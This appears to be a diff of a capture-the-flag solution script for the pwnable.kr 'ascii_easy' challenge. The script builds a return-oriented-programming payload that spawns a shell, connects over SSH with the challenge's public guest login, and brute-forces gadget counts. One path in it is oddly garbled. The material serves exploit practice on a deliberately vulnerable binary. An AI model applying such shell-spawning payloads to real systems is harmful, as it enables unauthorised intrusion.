@@ -34,17 +34,16 @@ INT_80_GADGET = 0x55667176
 STORE_MAX_INT_IN_EDX = 0x55617940
 STORE_DEREFERNCED_EDX_IN_ECX = 0x555f616f
 
-
 REMOTE_BINARY_PATH = '/home/ascii_easy/ascii_easy'
 
 
-def build_payload() -> bytes:
+def build_payload(i: int, j: int) -> bytes:
     rop_builder = ROP(elfs=[ELF('ascii_easy')])
 
-    increase_edx_until_bin_sh = [INCREASE_EDX_GADGET] * 6
+    increase_edx_until_bin_sh = [INCREASE_EDX_GADGET] * i
     increase_eax_to_sys_execve = [INCREASE_EAX_GADGET] * 11
 
-    increase_edx_until_zero = [INCREASE_EDX_GADGET] * 20
+    increase_edx_until_zero = [INCREASE_EDX_GADGET] * j
 
     store_zero_in_edx = [
         STORE_MAX_INT_IN_EDX,
@@ -69,14 +68,23 @@ def build_payload() -> bytes:
 
 
 def main() -> None:
-    # connection = ssh('ascii_easy', host='pwnable.kr', port=2222, password='guest')
-    #
+    connection = ssh('ascii_easy', host='pwnable.kr', port=2222, password='guest')
+
     # for i in range(4, 255):
     #     print(f'Checking {i} words...')
     #     p = connection.process([REMOTE_BINARY_PATH, build_payload(i)], REMOTE_BINARY_PATH)
     #     print(p.recvall(timeout=5))
 
-    print(build_payload().decode().replace('`', '\\`'))
+    context.log_level = 'error'
+    for i in range(4, 30):
+        for j in range(10, 200):
+            p = connection.process(
+                ['/home/or/workspAAAAAAAAAAAAAAAAaaaace/CTFs/pwnable/ascii_easy/ascii_easy', build_payload(i, j)],
+                executable='/home/or/workspace/CTFs/pwnable/ascii_easy/ascii_easy'
+            )
+            
+            p.recvall(timeout=6)
+            print(i, j)
 
 
 if __name__ == '__main__':
